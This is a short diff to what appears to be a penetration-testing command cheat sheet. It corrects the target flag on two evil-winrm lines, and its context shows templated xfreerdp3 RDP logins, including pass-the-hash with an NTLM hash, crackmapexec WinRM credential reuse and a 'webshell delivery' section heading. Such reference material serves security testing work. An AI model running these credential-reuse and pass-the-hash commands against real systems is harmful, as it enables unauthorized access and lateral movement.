@@ -27,8 +27,8 @@ xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /driv
 xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}}
 
 # === WINRM: CREDENTIAL REUSE (ports 5985/5986) ===
-evil-winrm -I {{TARGET}} -u {{USER}} -p {{PASS}}
-evil-winrm -I {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
+evil-winrm -i {{TARGET}} -u {{USER}} -p {{PASS}}
+evil-winrm -i {{TARGET}} -u {{USER}} -H {{NTLM_HASH}}
 crackmapexec winrm {{TARGET}} -u {{USER}} -p {{PASS}}
 
 # === WEB: WEBSHELL DELIVERY (ports 80/443/8080/8443) ===
